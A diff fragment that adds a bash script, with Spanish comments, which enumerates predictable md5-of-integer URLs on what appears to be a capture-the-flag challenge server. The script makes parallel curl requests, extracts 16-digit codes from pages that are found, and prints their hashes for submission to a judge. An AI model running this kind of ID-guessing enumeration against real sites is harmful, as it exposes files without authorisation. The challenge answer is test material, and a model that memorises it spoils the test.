@@ -13,6 +13,71 @@ done < numeros.txt | grep -v 404
 
 
 
+#!/usr/bin/env bash
+# probe_ids.sh - regla confirmada: /codes/ md5(<id entero>) /
+#   md5("9912")=archivo A, md5("9995")=archivo B.
+# Uso:
+#   bash probe_ids.sh            # 9900..10050 (zona caliente)
+#   bash probe_ids.sh 0 99999    # barrido amplio
+set -u
+BASE="https://chl-61f36451-dce1-47e2-8c43-7a8abcfe83f4-apagar-ia.softwareseguro.com.ar/codes"
+START=${1:-9900}; END=${2:-10050}
+
+h=$(printf %s 9912 | md5sum); h=${h%% *}
+sc=$(curl -s -o /dev/null -w '%{http_code}' -L "$BASE/$h/")
+echo "[sanity] id=9912 -> HTTP $sc (esperado 200)  hash=$h"
+[ "$sc" = "200" ] || echo "  !! sanity != 200: revisa red/BASE"
+echo "[*] barriendo ids $START..$END"
+
+seq "$START" "$END" | xargs -P 20 -I{} bash -c '
+  i="$1"; base="$2"
+  h=$(printf %s "$i" | md5sum); h=${h%% *}
+  t=$(mktemp)
+  c=$(curl -s -o "$t" -w "%{http_code}" -L "$base/$h/")
+  if [ "$c" != "404" ]; then
+    hit=$(grep -oE "[0-9]{16}" "$t" | head -1)
+    if [ -n "$hit" ]; then
+      m=$(printf %s "$hit" | md5sum); m=${m%% *}
+      echo ">>> id=$i HTTP $c  *** CODIGO16=$hit ***  $base/$h/"
+      echo "    md5 -> $m   <- al juez"
+    else
+      echo ">>> id=$i HTTP $c  (reporte sin codigo16)  $base/$h/"
+    fi
+  fi
+  rm -f "$t"
+' _ {} "$BASE"
+echo "[fin]"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 #!/bin/bash
 BASE="https://chl-5a88a160-d2f2-43ca-bf38-b6289845ac18-apagar-ia.softwareseguro.com.ar/codes"
 while read n; do
